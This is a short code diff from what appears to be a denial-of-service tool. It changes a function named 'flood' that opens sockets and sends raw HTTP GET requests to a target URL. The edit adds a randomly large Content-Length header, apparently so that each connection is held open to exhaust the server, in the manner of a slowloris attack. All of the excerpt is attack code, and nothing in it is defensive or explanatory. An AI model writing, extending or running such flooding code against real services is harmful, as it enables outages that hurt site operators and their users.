@@ -61,7 +61,7 @@ def flood(attack_id, url, stoptime) -> None:
             sock = open_socket()
 
             if sock:
-                sock.send(f"GET /{utils().buildblock('/', include=False)} HTTP/{Core.http_proto_ver}\r\n".encode())
+                sock.send(f"GET /{utils().buildblock('/', include=False)} HTTP/{Core.http_proto_ver}\r\nContent-Length: {str(randint(10000, 20000))}\r\n".encode())
 
                 for header in utils().buildheaders(url, if_socket=True):
                     sock.send(f"{header}\r\n".encode())
